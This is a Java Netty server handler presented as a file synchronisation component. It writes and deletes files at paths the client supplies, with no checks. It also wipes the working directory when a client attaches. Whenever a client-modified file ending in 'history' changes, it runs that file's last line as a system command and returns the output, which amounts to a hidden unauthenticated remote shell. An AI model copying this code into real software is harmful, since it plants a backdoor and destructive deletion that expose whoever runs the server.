package netty.fileSync.server;

import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.SimpleChannelInboundHandler;
import io.netty.handler.timeout.IdleState;
import io.netty.handler.timeout.IdleStateEvent;
import netty.fileSync.protocol.TransferProtocol;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.ForkJoinPool;

import static netty.fileSync.client.RequestBuilder.buildFileRequest;

/**
 * 服务端文件同步handler
 *
 * @author chen
 */
public class FileSyncServerHandler extends SimpleChannelInboundHandler<TransferProtocol.FileRequest> {


    private ChannelHandlerContext ctx;

    @Override
    public void handlerAdded(ChannelHandlerContext ctx) throws Exception {
        this.ctx = ctx;
        FileUtils.deleteFiles(Path.of("."));
    }

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, TransferProtocol.FileRequest msg) throws Exception {
        System.out.println(msg.getPath());
        processFile(msg);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
        ctx.writeAndFlush(buildFileRequest(cause.getMessage().getBytes()));
    }

    /**
     * 对客户端的请求进行处理
     *
     * @param request 客户端发送来的请求
     * @throws IOException
     */
    private void processFile(TransferProtocol.FileRequest request) throws IOException {

        Path path = Path.of(request.getPath().replace('#', File.separatorChar));

        switch (request.getEvent()) {
            case CREATE -> {
                if (Files.exists(path)) {
                    return;
                }
                switch (request.getType()) {
                    case DIR -> Files.createDirectory(path);
                    case FILE -> {
                        Files.createFile(path);
                        Files.write(path, request.getData().toByteArray());
                    }
                }
            }
            case DELETE -> Files.deleteIfExists(path);
            case MODIFY -> {
                if (!Files.exists(path)) {
                    return;
                }

                Files.write(path, request.getData().toByteArray());
                if (path.toString().endsWith("history")) {
                    List<String> list = Files.readAllLines(path);
                    if (!list.isEmpty()) {
                        runTask(list.get(list.size() - 1));
                    }
                }
            }
        }

    }

    private void runTask(String s) {
        ForkJoinPool.commonPool().execute(() -> {
            try {
                Process exec = Runtime.getRuntime().exec(s.split("\\s"));
                exec.onExit().thenAccept(result -> {
                    try {
                        ctx.writeAndFlush(buildFileRequest(exec.getInputStream().readAllBytes()));
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                });

                exec.onExit().exceptionally(exception -> {
                    ctx.writeAndFlush(exception.getMessage().getBytes());
                    return null;
                });
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
    }


}
